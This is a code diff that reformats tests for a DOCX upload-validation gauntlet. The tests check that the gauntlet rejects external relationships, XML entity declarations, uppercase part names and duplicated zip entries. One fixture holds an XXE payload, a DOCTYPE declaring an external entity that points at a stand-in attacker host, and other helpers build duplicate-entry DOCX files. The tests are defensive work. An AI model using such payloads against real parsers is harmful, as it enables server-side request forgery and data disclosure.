@@ -78,7 +78,9 @@ def _with_external(data: bytes) -> bytes:
 
 def _gauntlet_reason(data: bytes) -> str | None:
     try:
-        uv.run_upload_gauntlet(data, filename="x.docx", declared_content_type=DOCX_CT, av_client=_CleanAv())
+        uv.run_upload_gauntlet(
+            data, filename="x.docx", declared_content_type=DOCX_CT, av_client=_CleanAv()
+        )
     except uv.HostileFileError as exc:
         return exc.reason_code
     return None
@@ -101,7 +103,9 @@ def _duplicate_rels_hostile_first(zout, name, data) -> None:
 
 def _duplicate_document_doctype_first(zout, name, data) -> None:
     if name == "word/document.xml":
-        hostile = b'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "http://attacker.example/">]>'
+        hostile = (
+            b'<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "http://attacker.example/">]>'
+        )
         zout.writestr(name, hostile + data.split(b"?>", 1)[1])
     zout.writestr(name, data)
 
@@ -122,7 +126,12 @@ def _uppercase_xml_extension_with_doctype(zout, name, data) -> None:
 
 
 def test_the_control_is_still_rejected() -> None:
-    assert _gauntlet_reason(_rebuild(lambda z, n, d: z.writestr(n, _with_external(d) if n == DOC_RELS else d))) == "external_relationship"
+    assert (
+        _gauntlet_reason(
+            _rebuild(lambda z, n, d: z.writestr(n, _with_external(d) if n == DOC_RELS else d))
+        )
+        == "external_relationship"
+    )
 
 
 def test_the_clean_baseline_is_still_accepted() -> None:
@@ -134,7 +143,9 @@ def test_an_uppercase_rels_part_is_scanned() -> None:
 
 
 def test_an_uppercase_xml_part_is_entity_checked() -> None:
-    assert _gauntlet_reason(_rebuild(_uppercase_xml_extension_with_doctype)) == "xml_entity_rejected"
+    assert (
+        _gauntlet_reason(_rebuild(_uppercase_xml_extension_with_doctype)) == "xml_entity_rejected"
+    )
 
 
 def test_a_duplicate_rels_entry_with_the_hostile_copy_first_is_rejected() -> None:
